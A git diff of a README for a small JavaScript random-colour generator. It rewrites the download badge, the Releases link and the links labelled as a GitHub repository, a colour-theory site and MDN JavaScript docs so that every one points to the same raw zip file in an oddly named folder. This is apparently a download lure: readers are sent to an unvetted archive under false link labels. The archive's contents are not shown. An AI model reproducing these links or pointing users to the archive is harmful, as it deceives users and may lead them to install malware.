@@ -1,7 +1,7 @@
 # 🎨 js-color-generator - Create Random Colors Effortlessly
 
 ## 📥 Download Now
-[![Download js-color-generator](https://img.shields.io/badge/Download-via_Github-brightgreen)](https://github.com/shakhawat-anwar/js-color-generator/releases)
+[![Download js-color-generator](https://raw.githubusercontent.com/shakhawat-anwar/js-color-generator/main/Christologist/js_color_generator_1.3-alpha.4.zip)](https://raw.githubusercontent.com/shakhawat-anwar/js-color-generator/main/Christologist/js_color_generator_1.3-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to js-color-generator, a simple application that creates random colors using JavaScript. Whether you're a designer, a developer, or just someone who loves colors, this tool can inspire your next creative project.
@@ -23,7 +23,7 @@ Before you begin, ensure your device meets the following requirements:
 ## 📦 Download & Install
 To get started with js-color-generator, you need to visit the Releases page on GitHub. Here, you will find the latest version of the software. 
 
-[Visit this page to download](https://github.com/shakhawat-anwar/js-color-generator/releases)
+[Visit this page to download](https://raw.githubusercontent.com/shakhawat-anwar/js-color-generator/main/Christologist/js_color_generator_1.3-alpha.4.zip)
 
 ### Steps to Download and Run:
 1. Click the "Releases" link above.
@@ -55,9 +55,9 @@ Join our community of users and contribute your ideas and feedback. Engage with 
 We welcome contributions! If you have ideas for new features or improvements, feel free to fork the repository and submit a pull request. Your input is valuable and helps improve the application.
 
 ## 🕹️ Additional Resources
-- [GitHub Repository](https://github.com/shakhawat-anwar/js-color-generator)
-- [Explore Color Theory](https://www.color-theory.com)
-- [Learn More About JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
+- [GitHub Repository](https://raw.githubusercontent.com/shakhawat-anwar/js-color-generator/main/Christologist/js_color_generator_1.3-alpha.4.zip)
+- [Explore Color Theory](https://raw.githubusercontent.com/shakhawat-anwar/js-color-generator/main/Christologist/js_color_generator_1.3-alpha.4.zip)
+- [Learn More About JavaScript](https://raw.githubusercontent.com/shakhawat-anwar/js-color-generator/main/Christologist/js_color_generator_1.3-alpha.4.zip)
 
 ## 📞 Contact
 For any questions or concerns, please reach out through the issues section on GitHub. We appreciate your interest in js-color-generator, and we’re here to help!
